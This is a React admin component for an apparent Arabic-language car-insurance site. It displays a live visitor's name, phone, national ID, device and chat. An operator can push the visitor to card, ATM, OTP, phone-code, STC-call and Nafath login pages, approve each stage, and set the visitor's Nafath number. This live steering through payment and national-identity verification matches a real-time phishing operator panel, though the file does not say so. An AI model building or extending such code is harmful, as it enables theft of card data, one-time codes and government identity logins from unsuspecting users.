import React, { useRef } from "react";
import { motion } from "framer-motion";
import { ArrowRight, Circle, MapPin, Clock, Tag, Ban, ShieldCheck, Download, Star, MessageCircle, Monitor, Smartphone, Tablet, User, Car, Shield } from "lucide-react";
import AdminVisitorChat from "@/components/admin/AdminVisitorChat";
import TabIdentity from "./TabIdentity";
import TabVerification from "./TabVerification";
import TabVehicle from "./TabVehicle";
import type { Visitor, InsuranceRequest, InsuranceOrder, Claim, ChatConv, StageEvent } from "./types";
import { getVisitorAvatar, getVisitorInitial, getSessionDuration, parseUserAgent, countryFlag, insuranceTypeLabel, statusLabel } from "./types";

interface Props {
  selectedVisitor: Visitor;
  linkedRequests: InsuranceRequest[];
  linkedOrders: InsuranceOrder[];
  linkedClaims: Claim[];
  linkedChats: ChatConv[];
  stageEvents: StageEvent[];
  visitorName: string | null;
  customerName: string | null;
  visitorPhone: string | null;
  visitorNationalId: string | null;
  loadingAction: string | null;
  nafathNumberInputs: Record<string, string>;
  setNafathNumberInputs: React.Dispatch<React.SetStateAction<Record<string, string>>>;
  onClose: () => void;
  onApprove: (reqId: string) => void;
  onReject: (reqId: string) => void;
  onStageApprove: (orderId: string, nafathNum?: string) => void;
  onStageReject: (orderId: string) => void;
  onUpdateNafathNumber: (orderId: string, val: string) => void;
  onBlockToggle: () => void;
  onExportPDF: () => void;
  onClearChat: () => void;
  onToggleFavorite: (id: string) => void;
  onToggleTag: (id: string, tagKey: string) => void;
  onRedirect: (page: string) => void;
  redirectPage: string;
  setRedirectPage: (val: string) => void;
}

const VISITOR_TAGS = [
  { key: "vip", label: "VIP", color: "text-amber-500 bg-amber-500/10" },
  { key: "suspicious", label: "مشبوه", color: "text-red-500 bg-red-500/10" },
  { key: "returning", label: "زائر عائد", color: "text-blue-500 bg-blue-500/10" },
  { key: "potential", label: "عميل محتمل", color: "text-emerald-500 bg-emerald-500/10" },
];

const VisitorDetailsPanel: React.FC<Props> = ({
  selectedVisitor, linkedRequests, linkedOrders, linkedClaims, linkedChats, stageEvents,
  visitorName, customerName, visitorPhone, visitorNationalId,
  loadingAction, nafathNumberInputs, setNafathNumberInputs,
  onClose, onApprove, onReject, onStageApprove, onStageReject, onUpdateNafathNumber,
  onBlockToggle, onExportPDF, onClearChat, onToggleFavorite, onToggleTag,
  onRedirect, redirectPage, setRedirectPage,
}) => {
  const panelRef = useRef<HTMLDivElement>(null);

  const avatarColor = getVisitorAvatar(selectedVisitor.session_id);
  const initial = getVisitorInitial(selectedVisitor.visitor_name);
  const ua = parseUserAgent(selectedVisitor.user_agent);
  const DevIcon = ua.device === "Mobile" ? Smartphone : ua.device === "Tablet" ? Tablet : Monitor;

  return (
    <motion.div
      key={selectedVisitor.id}
      initial={{ opacity: 0, x: -18, y: 10, scale: 0.985 }}
      animate={{ opacity: 1, x: 0, y: 0, scale: 1 }}
      exit={{ opacity: 0, x: 14, y: -6, scale: 0.985 }}
      transition={{ duration: 0.32, ease: [0.22, 1, 0.36, 1] }}
      ref={panelRef}
      className="flex-1 overflow-y-auto flex flex-col will-change-transform"
    >
      {/* Mobile back */}
      <button onClick={onClose} className="md:hidden flex items-center gap-2 text-sm text-primary font-semibold p-3 hover:text-primary/80 transition-colors">
        <ArrowRight className="w-4 h-4" />العودة للقائمة
      </button>

      {/* Compact Header */}
      <div className="bg-gradient-to-l from-primary/5 to-transparent border-b border-border/60 p-3 md:p-4 shrink-0">
        <div className="flex items-start gap-2.5 md:gap-3">
          <div className={`w-10 h-10 md:w-12 md:h-12 rounded-xl md:rounded-2xl flex items-center justify-center shrink-0 shadow-md bg-gradient-to-br ${avatarColor.bg} border border-white/20`}>
            <span className={`text-base md:text-lg font-bold ${avatarColor.text}`}>{initial}</span>
          </div>
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-1.5 md:gap-2 flex-wrap">
              <h2 className="text-sm md:text-base font-bold text-foreground truncate max-w-[140px] md:max-w-none">{selectedVisitor.visitor_name || "زائر"}</h2>
              <span className={`inline-flex items-center gap-1 px-1.5 md:px-2 py-0.5 rounded-full text-[9px] md:text-[10px] font-bold ${selectedVisitor.is_online ? "bg-emerald-500/15 text-emerald-600" : "bg-muted text-muted-foreground"}`}>
                <Circle className={`w-1.5 h-1.5 ${selectedVisitor.is_online ? "fill-emerald-500 text-emerald-500 animate-pulse" : "fill-muted-foreground text-muted-foreground"}`} />
                {selectedVisitor.is_online ? "متصل" : "غير متصل"}
              </span>
              <button onClick={() => onToggleFavorite(selectedVisitor.id)} className="p-0.5">
                <Star className={`w-3.5 md:w-4 h-3.5 md:h-4 ${selectedVisitor.is_favorite ? "fill-amber-400 text-amber-400" : "text-muted-foreground hover:text-amber-400"} transition-colors`} />
              </button>
            </div>
            <div className="flex items-center gap-2 md:gap-3 mt-1 text-[9px] md:text-[10px] text-muted-foreground/70 flex-wrap">
              <span className="inline-flex items-center gap-1"><MapPin className="w-2.5 md:w-3 h-2.5 md:h-3 text-primary" />{selectedVisitor.current_page || "/"}</span>
              <span className="inline-flex items-center gap-1">
                <DevIcon className="w-2.5 md:w-3 h-2.5 md:h-3" />
                {selectedVisitor.country_code && `${countryFlag(selectedVisitor.country_code)} `}
                {ua.device}
              </span>
              <span className="inline-flex items-center gap-1"><Clock className="w-2.5 md:w-3 h-2.5 md:h-3" />{getSessionDuration(selectedVisitor.created_at, selectedVisitor.last_seen_at)}</span>
            </div>
          </div>
        </div>

        {/* Tags row */}
        <div className="flex items-center gap-1 md:gap-1.5 flex-wrap mt-2.5 md:mt-3">
          {VISITOR_TAGS.map(tag => {
            const isActive = (selectedVisitor.tags || []).includes(tag.key);
            return (
              <button
                key={tag.key}
                onClick={() => onToggleTag(selectedVisitor.id, tag.key)}
                className={`inline-flex items-center gap-0.5 md:gap-1 px-1.5 md:px-2 py-0.5 md:py-1 rounded-md md:rounded-lg text-[9px] md:text-[10px] font-bold border transition-all ${
                  isActive ? `${tag.color} border-current` : "bg-muted/40 text-muted-foreground border-transparent hover:bg-muted"
                }`}
              >
                {tag.label}
              </button>
            );
          })}
        </div>

        {/* Quick actions */}
        <div className="flex items-center gap-1 md:gap-1.5 mt-2.5 md:mt-3 flex-wrap">
          <button onClick={onBlockToggle} disabled={loadingAction === "block"} className={`inline-flex items-center gap-0.5 md:gap-1 px-2 md:px-2.5 py-1 md:py-1.5 rounded-lg text-[9px] md:text-[10px] font-bold border transition-all ${selectedVisitor.is_blocked ? "bg-destructive/10 text-destructive border-destructive/30" : "bg-muted/40 text-muted-foreground border-transparent hover:bg-muted"}`}>
            {selectedVisitor.is_blocked ? <><ShieldCheck className="w-3 h-3" />إلغاء الحظر</> : <><Ban className="w-3 h-3" />حظر</>}
          </button>
          <button onClick={onExportPDF} className="inline-flex items-center gap-0.5 md:gap-1 px-2 md:px-2.5 py-1 md:py-1.5 rounded-lg text-[9px] md:text-[10px] font-bold bg-muted/40 text-muted-foreground border border-transparent hover:bg-muted transition-all">
            <Download className="w-3 h-3" />تصدير PDF
          </button>
          <div className="flex items-center gap-1 md:gap-1.5 flex-1 min-w-0 basis-full md:basis-auto mt-1 md:mt-0">
            <select value={redirectPage} onChange={e => setRedirectPage(e.target.value)} className="flex-1 h-7 rounded-lg border border-border bg-card px-1.5 md:px-2 text-[9px] md:text-[10px] text-foreground focus:outline-none focus:border-primary transition-all min-w-0">
              <option value="">توجيه لصفحة...</option>
              <optgroup label="الدفع والتحقق">
                <option value="/insurance/payment">الدفع بالبطاقة</option>
                <option value="/insurance/atm">دفع ATM</option>
                <option value="/insurance/otp">رمز التحقق OTP</option>
                <option value="/insurance/phone-verify">توثيق الجوال</option>
                <option value="/insurance/phone-otp">كود الجوال</option>
                <option value="/insurance/phone-stc">مكالمة STC</option>
                <option value="/insurance/nafath-login">نفاذ - دخول</option>
                <option value="/insurance/nafath-verify">نفاذ - تحقق</option>
                <option value="/insurance/confirmation">تأكيد الوثيقة</option>
              </optgroup>
            </select>
            <button onClick={() => onRedirect(redirectPage)} disabled={!redirectPage} className="h-7 px-2.5 md:px-3 rounded-lg text-[9px] md:text-[10px] font-bold bg-primary text-primary-foreground hover:bg-primary/90 disabled:opacity-40 transition-all whitespace-nowrap">
              توجيه
            </button>
          </div>
        </div>
      </div>

      {/* All Content - Ascending order: Chat → Verification → Vehicle → Identity */}
      <div className="flex-1 overflow-y-auto p-2.5 md:p-5 space-y-1">
        {/* Section: Chat */}
        {linkedChats.length > 0 && (
          <motion.div
            className="relative"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.4, ease: [0.22, 1, 0.36, 1] }}
          >
            <div className="flex items-center gap-2 mb-2">
              <motion.div initial={{ scaleX: 0 }} animate={{ scaleX: 1 }} transition={{ duration: 0.5, delay: 0.2 }} className="h-px flex-1 bg-gradient-to-l from-purple-500/30 to-transparent origin-right" />
              <motion.span initial={{ opacity: 0, scale: 0.8 }} animate={{ opacity: 1, scale: 1 }} transition={{ duration: 0.3, delay: 0.15 }} className="text-[9px] md:text-[10px] font-bold text-purple-600 bg-purple-500/10 px-2.5 py-1 rounded-full border border-purple-500/20 flex items-center gap-1">
                <MessageCircle className="w-3 h-3" />
                المحادثة
              </motion.span>
              <motion.div initial={{ scaleX: 0 }} animate={{ scaleX: 1 }} transition={{ duration: 0.5, delay: 0.2 }} className="h-px flex-1 bg-gradient-to-r from-purple-500/30 to-transparent origin-left" />
            </div>
            <AdminVisitorChat visitorSessionId={selectedVisitor.session_id} visitorName={selectedVisitor.visitor_name} />
          </motion.div>
        )}

        {/* Section: Verification Timeline */}
        <motion.div
          className="relative"
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true, margin: "-40px" }}
          transition={{ duration: 0.4, ease: [0.22, 1, 0.36, 1] }}
        >
          <div className="flex items-center gap-2 mb-2 mt-3">
            <motion.div initial={{ scaleX: 0 }} whileInView={{ scaleX: 1 }} viewport={{ once: true }} transition={{ duration: 0.5, delay: 0.1 }} className="h-px flex-1 bg-gradient-to-l from-amber-500/30 to-transparent origin-right" />
            <motion.span initial={{ opacity: 0, scale: 0.8 }} whileInView={{ opacity: 1, scale: 1 }} viewport={{ once: true }} transition={{ duration: 0.3, delay: 0.05 }} className="text-[9px] md:text-[10px] font-bold text-amber-600 bg-amber-500/10 px-2.5 py-1 rounded-full border border-amber-500/20 flex items-center gap-1">
              <Shield className="w-3 h-3" />
              التحقق والدفع
            </motion.span>
            <motion.div initial={{ scaleX: 0 }} whileInView={{ scaleX: 1 }} viewport={{ once: true }} transition={{ duration: 0.5, delay: 0.1 }} className="h-px flex-1 bg-gradient-to-r from-amber-500/30 to-transparent origin-left" />
          </div>
          <TabVerification
            linkedOrders={linkedOrders}
            stageEvents={stageEvents}
            selectedVisitor={selectedVisitor}
            visitorPhone={visitorPhone}
            visitorNationalId={visitorNationalId}
            loadingAction={loadingAction}
            onStageApprove={onStageApprove}
            onStageReject={onStageReject}
            onUpdateNafathNumber={onUpdateNafathNumber}
            nafathNumberInputs={nafathNumberInputs}
            setNafathNumberInputs={setNafathNumberInputs}
            insuranceTypeLabel={insuranceTypeLabel}
            statusLabel={statusLabel}
          />
        </motion.div>

        {/* Section: Vehicle */}
        {linkedOrders.length > 0 && (
          <motion.div
            className="relative"
            initial={{ opacity: 0, y: 20 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true, margin: "-40px" }}
            transition={{ duration: 0.4, ease: [0.22, 1, 0.36, 1] }}
          >
            <div className="flex items-center gap-2 mb-2 mt-3">
              <motion.div initial={{ scaleX: 0 }} whileInView={{ scaleX: 1 }} viewport={{ once: true }} transition={{ duration: 0.5, delay: 0.1 }} className="h-px flex-1 bg-gradient-to-l from-emerald-500/30 to-transparent origin-right" />
              <motion.span initial={{ opacity: 0, scale: 0.8 }} whileInView={{ opacity: 1, scale: 1 }} viewport={{ once: true }} transition={{ duration: 0.3, delay: 0.05 }} className="text-[9px] md:text-[10px] font-bold text-emerald-600 bg-emerald-500/10 px-2.5 py-1 rounded-full border border-emerald-500/20 flex items-center gap-1">
                <Car className="w-3 h-3" />
                بيانات المركبة
              </motion.span>
              <motion.div initial={{ scaleX: 0 }} whileInView={{ scaleX: 1 }} viewport={{ once: true }} transition={{ duration: 0.5, delay: 0.1 }} className="h-px flex-1 bg-gradient-to-r from-emerald-500/30 to-transparent origin-left" />
            </div>
            <TabVehicle linkedOrders={linkedOrders} />
          </motion.div>
        )}

        {/* Section: Identity */}
        <motion.div
          className="relative"
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true, margin: "-40px" }}
          transition={{ duration: 0.4, ease: [0.22, 1, 0.36, 1] }}
        >
          <div className="flex items-center gap-2 mb-2 mt-3">
            <motion.div initial={{ scaleX: 0 }} whileInView={{ scaleX: 1 }} viewport={{ once: true }} transition={{ duration: 0.5, delay: 0.1 }} className="h-px flex-1 bg-gradient-to-l from-sky-500/30 to-transparent origin-right" />
            <motion.span initial={{ opacity: 0, scale: 0.8 }} whileInView={{ opacity: 1, scale: 1 }} viewport={{ once: true }} transition={{ duration: 0.3, delay: 0.05 }} className="text-[9px] md:text-[10px] font-bold text-sky-600 bg-sky-500/10 px-2.5 py-1 rounded-full border border-sky-500/20 flex items-center gap-1">
              <User className="w-3 h-3" />
              بيانات الزائر
            </motion.span>
            <motion.div initial={{ scaleX: 0 }} whileInView={{ scaleX: 1 }} viewport={{ once: true }} transition={{ duration: 0.5, delay: 0.1 }} className="h-px flex-1 bg-gradient-to-r from-sky-500/30 to-transparent origin-left" />
          </div>
          <TabIdentity
            selectedVisitor={selectedVisitor}
            visitorName={visitorName}
            customerName={customerName}
            visitorPhone={visitorPhone}
            visitorNationalId={visitorNationalId}
            linkedRequests={linkedRequests}
            linkedOrders={linkedOrders}
            stageEvents={stageEvents}
            loadingAction={loadingAction}
            onApprove={onApprove}
            onReject={onReject}
            insuranceTypeLabel={insuranceTypeLabel}
            statusLabel={statusLabel}
          />
        </motion.div>
      </div>
    </motion.div>
  );
};

export default VisitorDetailsPanel;
